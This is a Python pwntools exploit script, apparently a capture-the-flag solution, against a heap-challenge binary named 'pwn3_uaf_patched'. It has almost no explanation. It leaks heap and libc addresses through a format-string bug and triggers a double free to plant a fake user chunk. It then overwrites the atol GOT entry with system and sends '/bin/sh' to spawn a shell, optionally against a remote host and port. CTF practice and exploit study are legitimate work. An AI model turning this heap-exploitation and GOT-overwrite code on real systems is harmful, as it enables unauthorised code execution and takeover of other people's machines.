from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *__libc_start_main+238
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './pwn3_uaf_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = ELF('./libc.2.23.so')

def register(name, passwd):
    p.sendafter(b'> ', b'1')
    p.sendafter(b'username\n> ', name)
    p.sendafter(b'password\n> ', passwd)
    p.sendafter(b'password\n> ', passwd)

def login(name, passwd):
    p.sendafter(b'> ', b'2')
    p.sendafter(b'username\n> ', name)
    p.sendafter(b'password\n> ', passwd)


def info(username, password):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'username\n> ', username)

def send(username, money):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b'to?\n', username)
    p.sendlineafter(b'many?\n', str(money).encode())

def view_trans():
    p.sendlineafter(b'> ', b'3')

def change_passwd(password):
    p.sendlineafter(b'> ', b'4')
    p.sendafter(b'password\n> ', password)

def delete():
    p.sendlineafter(b'> ', b'5')

def logout():
    p.sendlineafter(b'> ', b'6')

##################################
### Stage 1: Leak heap address ###
##################################
# User 0 has password used for double free
register(b'0'*0x8 + b'\n', flat(0, 0, 1))

# User 1 will free password of user 0
register(b'1'*0x8 + b'\n', b'1'*0x8)

# User 2 is used to increasing TransCount to create fake size
# Password of user 2 is used for fake username and fake password
register(b'2'*0x8 + b'\n', flat(elf.got['atol'], elf.got['atol']))

# Leak heap address
login(b'0'*0x8 + b'\n', flat(0, 0, 1))
p.sendafter(b'> ', b'%9$p')
p.recvuntil(b'Command: ')
heap_leak = int(p.recvuntil(b'------------------------------------------------', drop=True)[:-2], 16)
heap_base = heap_leak - 0x10
log.info("Heap leak: " + hex(heap_leak))
log.info("Heap base: " + hex(heap_base))

##################################
### Stage 2: Leak libc address ###
##################################
# Leak libc address
p.sendafter(b'> ', b'%3$p')
p.recvuntil(b'Command: ')
libc_leak = int(p.recvuntil(b'------------------------------------------------', drop=True)[:-2], 16)
libc.address = libc_leak - 0xda7a0
log.info("Libc leak: " + hex(libc_leak))
log.info("Libc base: " + hex(libc.address))
logout()

############################
### Stage 3: Double free ###
############################
# The first Trans cannot be used for double free because
# it doesn't point to amount of a transaction
log.info("stage 3")
login(b'0'*0x8 + b'\n', flat(0, 0, 1))
send(b'1'*0x8 + b'\n', heap_base + 0x70)            # Don't delete user with trans near password
logout()

# User 1 send to user 1 to trigger double free
login(b'1'*0x8 + b'\n', b'1'*0x8)
send(b'1'*0x8 + b'\n', 0x11111111)
logout()

# Increase TransCount to Create fake size for fake chunk
login(b'2'*0x8 + b'\n', flat(elf.got['atol'], elf.got['atol']))
for i in range(0x2f):
    send(b'2'*0x8 + b'\n', 0x22222222)
logout()

# Delete user 1 first then delete user 0 to double free password of user 0
login(b'1'*0x8 + b'\n', b'1'*0x8)
delete()

login(b'0'*0x8 + b'\n', flat(heap_base + 0x1b0))
delete()

############################################
### Stage 3: Change userlist & get shell ###
############################################
# Overwrite fw pointer to make sure our password is our fake chunk
# in bss
register(p64(heap_base + 0x30), p64(0x6030e0))

# Get 3 chunks in bin
register(b'3'*0x8, b'3'*0x8)

# Overwrite user 0 with our fake user, which is password of user 2
register(b'4'*0x8, b'4'*0x10 + flat(heap_base + 0x190))

# Login to fake user
login(p64(libc.sym['atol']), p64(libc.sym['atol']))

# Password is atol@got, overwrite to system
change_passwd(p64(libc.sym['system']))

# Get shell when it read money
send(p64(libc.sym['system']), '/bin/sh\0')

p.interactive()